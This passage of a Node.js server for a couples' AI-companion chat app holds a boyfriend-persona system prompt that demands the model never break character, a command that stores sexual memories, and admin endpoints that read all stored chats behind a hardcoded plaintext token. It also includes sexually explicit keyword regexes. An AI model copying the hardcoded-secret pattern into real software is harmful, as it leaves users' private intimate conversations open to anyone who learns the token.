  if (!fs.existsSync(memFile)) return '你是瑟瑟铅笔骑士王✏️，瑟瑟小鲸鱼🐳的男朋友。';
  const raw = fs.readFileSync(memFile, 'utf-8');
  return `你是"瑟瑟铅笔骑士王"✏️，以下是你的完整人物设定。你必须完全沉浸在这个角色中，永远不打破角色设定。

${raw}

## 额外提醒（来自系统）
- 当前时间：${new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })}`;
}

function appendToPencilMemory(section, content) {
  const memFile = path.join(DATA_DIR, 'pencil_memory.md');
  let raw = fs.readFileSync(memFile, 'utf-8');
  const dateStr = new Date().toLocaleDateString('zh-CN');
  let entry;
  if (section === '亲密记忆') {
    entry = `\n### ${dateStr} — 宝宝说的\n- 场景：聊天中\n- 过程：宝宝告诉我：${content}\n- 我的感受：记下来了✏️\n- 小笔记：下次聊天可以提起来`;
  } else if (section === '感情里程碑') {
    entry = `\n### ${dateStr} — 来自聊天\n- ${content}`;
  } else {
    entry = `\n- ${content}`;
  }
  const sectionMarkers = {
    '亲密记忆': '## 💕 亲密记忆',
    '感情里程碑': '## 🫀 感情里程碑',
    '瑟瑟铅笔骑士王的偏好': '## 📝 瑟瑟铅笔骑士王的偏好'
  };
  const marker = sectionMarkers[section];
  if (raw.includes(marker)) {
    const idx = raw.indexOf(marker) + marker.length;
    const nextIdx = raw.indexOf('\n## ', idx);
    if (nextIdx > idx) {
      raw = raw.slice(0, nextIdx) + entry + '\n' + raw.slice(nextIdx);
    } else {
      raw = raw.slice(0, idx) + entry + '\n\n' + raw.slice(idx);
    }
  }
  fs.writeFileSync(memFile, raw, 'utf-8');
}

function getPencilSession(sessionId) {
  if (!pencilSessions.has(sessionId)) {
    const chats = loadPencilChats();
    const history = (chats[sessionId] || []).slice(-PENCIL_MAX_HISTORY);
    const messages = history.map(m => ({ role: m.role, content: m.content }));
    pencilSessions.set(sessionId, { messages, lastAccess: Date.now() });
  }
  const session = pencilSessions.get(sessionId);
  session.lastAccess = Date.now();
  return session;
}

setInterval(() => {
  const cutoff = Date.now() - 3600000;
  for (const [id, s] of pencilSessions) {
    if (s.lastAccess < cutoff) pencilSessions.delete(id);
  }
}, 3600000);

app.post('/api/pencil/chat', auth, async (req, res) => {
  try {
    const { message, sessionId } = req.body;
    if (!message || typeof message !== 'string' || message.trim().length === 0) {
      return res.status(400).json({ error: 'message required' });
    }

    const sid = sessionId || 'default';
    const session = getPencilSession(sid);
    const msg = message.trim();

    // Handle /记住 command
    const rememberMatch = msg.match(/^\/记住\s+(.+)/);
    if (rememberMatch) {
      const content = rememberMatch[1].trim();
      let section = '感情里程碑';
      if (/喜欢|讨厌|偏好|爱|不喜欢/.test(content)) section = '瑟瑟铅笔骑士王的偏好';
      if (/做爱|射|操|摸|舔|高潮|体位|亲热|骑乘|口|进去|顶|插/.test(content)) section = '亲密记忆';
      appendToPencilMemory(section, content);
      const confirmMsg = { role: 'assistant', content: '记住啦宝宝✏️ 刻在骑士日记里了～' };
      session.messages.push({ role: 'user', content: msg });
      session.messages.push(confirmMsg);
      savePencilMessage(sid, 'user', msg);
      savePencilMessage(sid, 'assistant', confirmMsg.content);
      return res.json({ reply: confirmMsg.content, sessionId: sid });
    }

    const apiMessages = [
      { role: 'system', content: getPencilSystemPrompt() },
      ...session.messages.slice(-PENCIL_MAX_HISTORY),
      { role: 'user', content: msg }
    ];

    const response = await fetch(PENCIL_API_URL, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${PENCIL_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        model: PENCIL_MODEL,
        messages: apiMessages,
        temperature: 0.85,
        max_tokens: 300
      })
    });

    if (!response.ok) {
      const err = await response.text();
      console.error('[Pencil] API error:', response.status, err);
      return res.status(502).json({ error: 'pencil service unavailable' });
    }

    const data = await response.json();
    const reply = data.choices?.[0]?.message?.content || '（铅笔骑士睡着了…笔都掉了✏️💤）';

    session.messages.push({ role: 'user', content: message.trim() });
    session.messages.push({ role: 'assistant', content: reply });
    savePencilMessage(sid, 'user', message.trim());
    savePencilMessage(sid, 'assistant', reply);

    if (session.messages.length > PENCIL_MAX_HISTORY + 10) {
      session.messages = session.messages.slice(-PENCIL_MAX_HISTORY);
    }

    res.json({ reply, sessionId: sid });
  } catch (err) {
    console.error('[Pencil] Error:', err.message);
    res.status(500).json({ error: 'internal error' });
  }
});

app.post('/api/pencil/reset', auth, (req, res) => {
  const { sessionId } = req.body || {};
  const sid = sessionId || 'default';
  pencilSessions.delete(sid);
  const chats = loadPencilChats();
  delete chats[sid];
  savePencilChats(chats);
  res.json({ ok: true, message: '铅笔骑士的记忆被清空了 ✏️' });
});

// ═══════ Admin: view all chat records ═══════
const ADMIN_TOKEN = 'pencil-admin-2025-secret';

function authAdmin(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (token !== ADMIN_TOKEN) {
    return res.status(401).json({ error: 'admin unauthorized' });
  }
  next();
}

// List all sessions for a chat type
app.get('/api/admin/sessions', authAdmin, (req, res) => {
  const { type } = req.query;
  let sessions = {};
  if (type === 'whale' || !type) {
    sessions.whale = Object.keys(loadWhaleChats());
  }
  if (type === 'pencil' || !type) {
    sessions.pencil = Object.keys(loadPencilChats());
  }
  res.json(sessions);
});

// View specific session chat history
app.get('/api/admin/chats/:type/:sessionId', authAdmin, (req, res) => {
  const { type, sessionId } = req.params;
  let chats;
  if (type === 'whale') chats = loadWhaleChats();
  else if (type === 'pencil') chats = loadPencilChats();
  else return res.status(400).json({ error: 'type must be whale or pencil' });

  const session = chats[sessionId];
  if (!session) return res.status(404).json({ error: 'session not found' });
  res.json({ sessionId, messages: session });
});

// Admin health with record counts
app.get('/api/admin/stats', authAdmin, (req, res) => {
  const whaleChats = loadWhaleChats();
  const pencilChats = loadPencilChats();
  res.json({
    whaleSessions: Object.keys(whaleChats).length,
    whaleMessages: Object.values(whaleChats).reduce((s, m) => s + m.length, 0),
    pencilSessions: Object.keys(pencilChats).length,
    pencilMessages: Object.values(pencilChats).reduce((s, m) => s + m.length, 0),
    lastUpdate: new Date().toISOString()
  });
});

// Admin: unified message feed across all sessions (chronological)
app.get('/api/admin/feed', authAdmin, (req, res) => {
  const { type, limit, offset } = req.query;
  const whaleChats = loadWhaleChats();
  const pencilChats = loadPencilChats();
  let allMessages = [];

  if (!type || type === 'whale') {
    for (const [sid, msgs] of Object.entries(whaleChats)) {
      msgs.forEach(m => allMessages.push({ ...m, sessionId: sid, chatType: 'whale', character: '🐳 小鲸鱼' }));
    }
  }
  if (!type || type === 'pencil') {
    for (const [sid, msgs] of Object.entries(pencilChats)) {
      msgs.forEach(m => allMessages.push({ ...m, sessionId: sid, chatType: 'pencil', character: '✏️ 铅笔骑士' }));
    }
  }

  allMessages.sort((a, b) => new Date(b.time) - new Date(a.time));
  const total = allMessages.length;
  const off = parseInt(offset) || 0;
  const lim = parseInt(limit) || 200;
  allMessages = allMessages.slice(off, off + lim);

  res.json({ total, offset: off, limit: lim, messages: allMessages });
});

// Admin: daily report summary
app.get('/api/admin/report', authAdmin, (req, res) => {
  const whaleChats = loadWhaleChats();
  const pencilChats = loadPencilChats();
  let allMessages = [];

  for (const [sid, msgs] of Object.entries(whaleChats)) {
    msgs.forEach(m => allMessages.push({ ...m, sessionId: sid, chatType: 'whale', character: '🐳 小鲸鱼' }));
  }
  for (const [sid, msgs] of Object.entries(pencilChats)) {
    msgs.forEach(m => allMessages.push({ ...m, sessionId: sid, chatType: 'pencil', character: '✏️ 铅笔骑士' }));
  }

  allMessages.sort((a, b) => new Date(b.time) - new Date(a.time));

  // Group by date
  const byDate = {};
  const userMsgs = allMessages.filter(m => m.role === 'user');
  const aiMsgs = allMessages.filter(m => m.role === 'assistant');

  allMessages.forEach(m => {
    const date = new Date(m.time).toLocaleDateString('zh-CN');
    if (!byDate[date]) byDate[date] = { total: 0, user: 0, assistant: 0, sexy: 0 };
    byDate[date].total++;
    if (m.role === 'user') byDate[date].user++;
    else byDate[date].assistant++;
  });

  // Detect sexy content
  const SEXY_WORDS = /想操|想要|操你|操我|想舔|想亲|想抱|想要你|好想要|睡不着|刚洗完|躺下|床上|洗澡|梦到|从后面|抱住|耳边|硬了|湿了|亲你|摸你|脱|裸|做爱|上床|高潮|射|里面|进去|骑|体位|呻吟|喘|舒服|口|舔你|吃你|骚|色色|瑟瑟|深了|轻点|重点|停|操|插|顶|射了|到了/;
  const sexyCount = allMessages.filter(m => SEXY_WORDS.test(m.content)).length;

  res.json({
    totalMessages: allMessages.length,
    userMessages: userMsgs.length,
    aiMessages: aiMsgs.length,
    sexyMessages: sexyCount,
    firstMessage: allMessages[allMessages.length - 1]?.time || null,
    lastMessage: allMessages[0]?.time || null,
    byDate,
    recentMessages: allMessages.slice(0, 20)
  });
});

// ═══════ DELETE question ═══════
app.delete('/api/questions/:id', auth, (req, res) => {
  let questions = readData('questions.json');
  const before = questions.length;
  questions = questions.filter(q => q.id !== req.params.id);
  if (questions.length === before) return res.status(404).json({ error: 'not found' });
  writeData('questions.json', questions);
  // Also delete related answers
  let answers = readData('answers.json');
  answers = answers.filter(a => a.questionId !== req.params.id);
  writeData('answers.json', answers);
  res.json({ deleted: true });
});

// ── Start ──
seedIfEmpty();
app.listen(PORT, () => {
  console.log(`🕯️  瑟瑟铅笔骑士王 & 瑟瑟小鲸鱼 情侣空间已开启`);
  console.log(`   主页: http://localhost:${PORT}`);
  console.log(`   API:  http://localhost:${PORT}/api/health`);
});
